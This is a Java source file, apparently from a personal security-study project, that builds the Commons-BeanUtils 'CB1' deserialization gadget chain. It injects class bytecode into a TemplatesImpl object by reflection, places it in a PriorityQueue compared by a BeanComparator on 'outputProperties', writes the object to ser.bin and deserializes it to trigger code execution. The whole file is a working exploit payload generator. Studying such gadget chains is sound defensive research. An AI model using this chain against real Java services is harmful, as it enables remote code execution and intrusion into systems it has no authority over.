package CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl template = new TemplatesImpl();
        byte[] codes = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\ClassLoad\\TemplateCode.class"));
        setField(template, "_name", "pysnow");
        setField(template, "_bytecodes", new byte[][]{codes});
        setField(template, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator();
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        setField(beanComparator, "property", "outputProperties");
        setField(priorityQueue, "queue", new Object[]{template, template});
        setField(priorityQueue,"comparator",beanComparator);
        serialize(priorityQueue);
        unserialize("ser.bin");

    }

    public static void setField(Object object, String name, Object value) throws Exception {
        Field field = object.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
